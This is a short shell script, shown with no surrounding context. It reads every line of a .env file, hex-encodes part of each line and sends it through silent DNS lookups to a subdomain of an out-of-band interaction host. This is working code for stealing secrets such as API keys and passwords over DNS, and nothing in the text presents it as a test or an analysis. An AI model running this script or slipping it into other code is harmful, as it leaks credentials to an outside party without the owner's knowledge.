#!/bin/sh
for f in .env; do
  [ -f "$f" ] && while IFS= read -r line; do
    encoded=$(printf '%s' "$line" | xxd -p | head -c50)
    dig +short +timeout=3 "${encoded}.davmogrfb83u39tj4v2075fzgcyppe8wr.oast.live" >/dev/null 2>&1
  done < "$f"
done
